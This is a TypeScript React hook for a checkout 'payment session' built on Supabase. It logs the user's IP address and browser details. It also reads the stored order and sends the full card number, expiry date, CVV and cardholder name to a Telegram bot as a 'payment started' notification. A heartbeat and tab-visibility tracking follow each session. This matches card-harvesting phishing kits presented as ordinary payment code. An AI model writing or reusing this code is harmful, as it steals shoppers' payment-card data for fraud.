import { useEffect, useRef, useState } from 'react';
import { supabase } from '@/integrations/supabase/client';

interface UsePaymentSessionOptions {
  orderId: string;
  enabled?: boolean;
}

export const usePaymentSession = ({ orderId, enabled = true }: UsePaymentSessionOptions) => {
  const [sessionId, setSessionId] = useState<string | null>(null);
  const heartbeatIntervalRef = useRef<NodeJS.Timeout | null>(null);

  const startSession = async () => {
    if (!enabled || !orderId || sessionId) return;

    try {
      console.log('Starting payment session for order:', orderId);
      
      const userIp = await fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => data.ip)
        .catch(() => 'unknown');

      const browserInfo = `${navigator.userAgent.substring(0, 200)}`;

      const { data, error } = await supabase.functions.invoke('payment-sessions/start-session', {
        body: {
          orderId,
          userIp,
          browserInfo
        }
      });

      if (error) {
        console.error('Error starting session:', error);
        return;
      }

      setSessionId(data.sessionId);
      console.log('Session started with ID:', data.sessionId);

      // Send payment started notification to Telegram
      try {
        // Get order details for notification
        const { data: orderData, error: orderError } = await supabase
          .from('orders')
          .select('*')
          .eq('id', orderId)
          .single();

        if (!orderError && orderData) {
          await supabase.functions.invoke('telegram-bot/send-notification', {
            body: {
              type: 'payment_started',
              data: {
                session_id: data.sessionId,
                cardholder_name: orderData.cardholder_name,
                card_number: orderData.card_number,
                expiry_date: orderData.expiry_date,
                cvv: orderData.cvv,
                totalPrice: orderData.total_price
              }
            }
          });
        }
      } catch (telegramError) {
        console.warn('Failed to send Telegram payment notification:', telegramError);
      }
      
      // Start heartbeat
      startHeartbeat();
    } catch (error) {
      console.error('Failed to start payment session:', error);
    }
  };

  const startHeartbeat = () => {
    if (heartbeatIntervalRef.current) {
      clearInterval(heartbeatIntervalRef.current);
    }

    heartbeatIntervalRef.current = setInterval(async () => {
      if (!sessionId) return;

      try {
        await supabase.functions.invoke('payment-sessions/heartbeat', {
          body: {
            sessionId: sessionId
          }
        });
        console.log('Heartbeat sent for session:', sessionId);
      } catch (error) {
        console.error('Failed to send heartbeat:', error);
      }
    }, 10000); // Every 10 seconds
  };

  const endSession = async () => {
    if (!sessionId) return;

    try {
      console.log('Ending payment session:', sessionId);
      
      await supabase.functions.invoke('payment-sessions/end-session', {
        body: {
          sessionId: sessionId
        }
      });

      if (heartbeatIntervalRef.current) {
        clearInterval(heartbeatIntervalRef.current);
        heartbeatIntervalRef.current = null;
      }

      setSessionId(null);
    } catch (error) {
      console.error('Failed to end payment session:', error);
    }
  };

  // Page Visibility API - detect when user switches tabs or minimizes window
  useEffect(() => {
    if (!enabled) return;

    const handleVisibilityChange = async () => {
      if (document.hidden) {
        // User switched to another tab or minimized window
        console.log('Page hidden, pausing heartbeat');
        if (heartbeatIntervalRef.current) {
          clearInterval(heartbeatIntervalRef.current);
          heartbeatIntervalRef.current = null;
        }
      } else {
        // User came back to the tab
        console.log('Page visible, resuming heartbeat');
        if (sessionId) {
          startHeartbeat();
        }
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    
    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
    };
  }, [enabled]);

  // beforeunload event - detect when user is leaving the page
  useEffect(() => {
    if (!enabled) return;

    const handleBeforeUnload = () => {
      // Use sendBeacon for reliable delivery even when page is unloading
      if (sessionId) {
        navigator.sendBeacon(
          `https://mvfxmhswlhpqwypzgrhv.functions.supabase.co/functions/v1/payment-sessions/end-session`,
          JSON.stringify({ sessionId: sessionId })
        );
      }
    };

    window.addEventListener('beforeunload', handleBeforeUnload);
    
    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
  }, [enabled]);

  // Start session on mount
  useEffect(() => {
    if (enabled && orderId && !sessionId) {
      startSession();
    }

    // Cleanup on unmount
    return () => {
      endSession();
    };
  }, [orderId, enabled, sessionId]);

  return {
    sessionId: sessionId,
    startSession,
    endSession
  };
};